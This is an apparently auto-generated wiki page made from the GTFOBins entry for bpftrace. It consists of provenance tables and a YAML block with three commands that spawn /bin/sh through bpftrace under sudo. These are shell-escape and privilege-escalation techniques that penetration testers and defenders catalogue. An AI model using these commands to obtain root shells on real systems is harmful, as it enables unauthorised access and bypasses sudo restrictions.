---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# bpftrace

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `bpftrace` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/bpftrace` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [bpftrace](../../tools/linux/bpftrace.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | bpftrace |
| name | bpftrace |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/bpftrace/ |

## Preserved Source Material

```yaml
_body: ''
_name: bpftrace
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/bpftrace
functions:
  shell:
  - code: bpftrace --unsafe -e 'BEGIN {system("/bin/sh 1<&0");exit()}'
    contexts:
      sudo: null
  - code: 'echo ''BEGIN {system("/bin/sh 1<&0");exit()}'' >/path/to/temp-file

      bpftrace --unsafe /path/to/temp-file'
    contexts:
      sudo: null
  - code: bpftrace -c /bin/sh -e 'END {exit()}'
    contexts:
      sudo: null
```
